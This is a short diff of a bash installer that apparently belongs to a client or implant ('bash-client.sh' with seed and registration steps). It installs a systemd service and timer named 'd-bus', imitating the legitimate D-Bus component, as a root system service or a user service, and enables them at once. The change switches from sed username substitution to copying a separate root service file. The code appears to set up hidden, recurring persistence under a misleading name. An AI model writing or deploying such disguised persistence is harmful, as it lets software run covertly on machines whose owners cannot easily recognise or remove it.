@@ -14,6 +14,7 @@ script=./bash-client.sh
 service_dest=~/.config/systemd/user
 sys_service_dest=/etc/systemd/system
 service=d-bus.service
+root_service=root.d-bus.service
 timer=d-bus.timer
 
 function init_seed() {
@@ -35,14 +36,14 @@ function register() {
 function init_systemd() {
     #If the user is root, configure as a system service
     if [ $(id -u) -eq 0 ]; then
-        #Remove placeholder username
-		sed "s/home\/whoami/root/g" $service > $sys_service_dest/$service
+        #Install systemd service
+		cp $root_service $sys_service_dest/$service
         #Install and enable timer
 		cp $timer $sys_service_dest/$timer
 		systemctl enable --now $timer
 	else
         #Same thing but installing service as a user service instead
-		sed "s/whoami/$user/g" $service > $service_dest/$service
+		cp $service $service_dest/$service
 		cp $timer $service_dest/$timer
 		systemctl enable --user --now $timer
 	fi
